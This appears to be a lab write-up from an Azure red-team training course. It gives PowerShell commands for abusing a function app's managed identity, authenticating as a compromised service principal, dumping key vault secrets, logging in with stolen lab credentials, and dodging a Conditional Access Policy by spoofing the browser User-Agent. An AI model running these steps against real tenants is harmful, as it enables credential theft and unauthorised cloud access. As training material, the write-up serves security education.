## Objective 18 ***Part of - Kill Chain - 3***

```
- Abuse the Managed Identity of the 'processfile' function app to compromise an Enterprise Application.
- Enumerate the permissions that the Enterprise Application has in defcorphq tenant and abuse the permissions to extract secrets from a key vault.
- Using the secrets from the key vault, extract credentials of a user from deployment history of one of the resource groups.
```

- In virusscanner app `https://virusscanner.azurewebsites.net/` we fount that the managed identity for the app ***has permissions to add secrets to the enterprise application **`fileapp`*****
 ![test](/img/obj18a.png "Enumeration")

 Execute the below command and retrieve the **function app process file**

 **PS.**Note that this will not impact further attacks. We looked at it just to understand that function apps may be in use behind app services. In fact, that is the most common use case of function aps. In this case, the processfile function app is processing the fileuploads to the virusscanner app service.
```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$passwd = ConvertTo-SecureString "SuperS3Cr31PAssw0rd!@l33t" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com",$passwd)
Connect-AzureAD -Credential $creds
```

**Please remember you may need to change the secret in the command below to the one that ***you added earlier:*****
```powershell
$password = ConvertTo-SecureString '_1ATfh--GD.WBhRuP.H3p_iR~MX2W1OA6S' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-983fa7f3bd317d8f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```
- Now, list the resources readable by the service principal:
```powershell
 Get-AzResource
```
 ![test](/img/obj18b.png "Enumeration")
- Access to a key vault! Check if we can list and read any secrets!
```powershell
Get-AzKeyVaultSecret -VaultName credvault-fileapp
Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText
```
- Let's use the above credentials to authenticate!
```powershell
$password = ConvertTo-SecureString '!@Ka%%ya71&*FG2243gs49' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DavidDHenriques@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```
- A Conditional Access Policy is blocking access for the user David. Let's try using the poral:
 ![test](/img/obj18c.png "Enumeration")
 ![test](/img/obj18d.png "Enumeration")

- Change the `User-Agent` or press `F12` on the browser and click on toggle device toolbar.
 ![test](/img/obj18e.png "Enumeration")

- Once logged in as a `DavidDHenriques_defcorphq.onmicrosoft.com` user look at the deployment template and you will find that the template is trying to execute a command during deployment.

In the template we got the credentials for a user that belongs to another tenant `thomasebarlow@defcorpit.onmicrosoft.com` 

 ![test](/img/obj18f.png "Enumeration")



